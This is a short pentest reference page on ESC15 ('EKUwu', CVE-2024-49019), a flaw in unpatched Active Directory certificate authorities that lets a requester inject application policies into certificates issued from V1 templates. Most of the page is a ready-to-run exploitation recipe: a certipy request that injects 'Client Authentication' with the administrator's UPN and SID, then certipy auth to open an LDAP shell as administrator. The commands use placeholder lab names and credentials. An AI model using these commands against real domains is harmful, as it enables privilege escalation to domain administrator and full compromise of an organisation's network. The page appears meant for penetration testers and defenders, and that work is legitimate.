# ESC15

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**ESC15**</mark>, also known by the community name <mark style="color:yellow;">**"EKUwu"**</mark> (research by Justin Bollinger from TrustedSec) and tracked as **CVE-2024-49019**, describes a vulnerability affecting unpatched CAs. It allows an attacker to inject arbitrary Application Policies into a certificate issued from a Version 1 (Schema V1) certificate template. If CA is not patched, it could include these Attacker-given policies and grant certificate with unintented capabilities.

## <mark style="color:yellow;">EXPLOITATION</mark>

> I used Scenario A

#### **Request a certificate, injecting "Client Authentication" Application Policy and target UPN.**

```bash
certipy req -u 'netrunner@arasaka.local' -p 'P@ssword123' -dc-ip '13.13.13.13' -target 'CA.ARASAKA.LOCAL' -ca 'ARASAKA-CA' -template 'WebServer' -upn 'administrator@arasaka.local' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
```

#### Use certificate to get a LDAPS shell

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '13.13.13.13' -ldap-shell
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu" %}
